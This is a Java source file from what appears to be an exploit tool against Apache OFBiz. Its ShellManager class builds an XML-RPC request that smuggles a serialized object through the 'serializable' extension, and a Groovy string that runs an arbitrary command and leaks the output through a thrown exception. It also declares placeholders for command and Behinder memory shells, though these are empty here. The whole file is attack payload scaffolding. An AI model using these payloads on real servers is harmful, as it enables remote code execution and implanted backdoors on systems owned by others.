package org.ofbiz.shell;

public class ShellManager {
    private static final String XMLRPC_DESERIALIZABLE =
            "<?xml version=\"1.0\"?>" +
            "<methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value>" +
            "<serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">%s</serializable>" +
            "</value></member></struct></value></param></params></methodCall></xml>";

    private static final String GROOVY_SHELL = "throw new Exception(\"%s\".execute().text);";

    public static final String CMD_MEMSHELL = "";
    public static final String BEHINDER_MEMSHELL = "";

    public static String getGroovyShell(String cmd){
        return String.format(GROOVY_SHELL, cmd);
    }

    public static String getXmlrpcDeserializable(String shell){
        return String.format(XMLRPC_DESERIALIZABLE, shell);
    }
}
